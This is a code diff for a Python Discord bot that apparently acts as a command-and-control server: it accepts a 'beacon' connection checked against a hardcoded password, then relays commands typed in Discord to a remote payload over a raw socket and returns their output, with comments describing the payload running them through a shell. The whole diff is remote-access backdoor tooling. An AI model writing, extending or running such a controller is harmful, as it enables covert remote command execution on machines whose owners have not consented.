@@ -9,7 +9,6 @@ import discord
 from discord.ext import commands
 
 bot = commands.Bot(command_prefix='!')
-remoteAddr = ''
 
 @bot.command()
 async def run(ctx, *args):
@@ -25,14 +24,14 @@ async def run(ctx, *args):
 
     ##################################################send to remote
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send greeting to command server
-        s.connect((remoteAddr, 4455))
-        command = shlex.split(cmd)
-        print('Sending command to payload @' + remoteAddr)
-        s.sendall(bytes(command))
+        print('Sending command to payload @ ' + remoteAddr[0])
+        s.connect((remoteAddr[0], 22705))
+        s.sendall(bytes(cmd, 'utf-8'))
 
         ##this is what the remote payload does
-        ##process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
-        ##stdout, stderr = process.communicate()
+        #command = shlex.split(cmd)
+        #process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
+        #stdout, stderr = process.communicate()
 
         data = s.recv(1024)
         stdout = data.decode("utf-8")
@@ -45,33 +44,36 @@ async def run(ctx, *args):
 
 ######################################################Command init
 def main(*args):
-
-    with open('secrets.txt') as f:
-        secret = f.read()
-        bot.run(secret)
-
-    if len(args) > 1:
-        password = args[1]
-    else:
-        password = input('Password for beacon: ')
+    password = '$$thisPa$_3w0rdSl@ps'
+    if password == '':
+        if len(args) > 1:
+            password = args[1]
+        else:
+            password = input('Password for beacon: ')
 
     #for now this just accepts one beacon and then goes to command, this should be a thread so it can accept multiple
     #beacons.
     beacon = 'CONNECT: ' + password
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind(('', 4454))
+        s.bind(('', 22704))
         s.listen()
         conn, addr = s.accept()
         with conn:
-            print('Connected by', addr)
+            print('Beacon connection from', addr)
             data = conn.recv(1024)
-            if repr(data) == bytes(beacon):
-                remoteAddr = addr
+            if data == bytes(beacon, 'utf-8'):
                 conn.sendall(b'ACCEPTED')
                 print('Authenticated ', addr)
+                global remoteAddr
+                remoteAddr = addr  # ill fix this in a sec
             else:
                 conn.sendall(b'BAD CRED')
                 print('Rejected ', addr, '| 10:BAD CRED')
 
+    with open('secrets.txt') as f:
+        secret = f.read()
+        bot.run(secret)
 
 
+if __name__ == '__main__':
+    main()
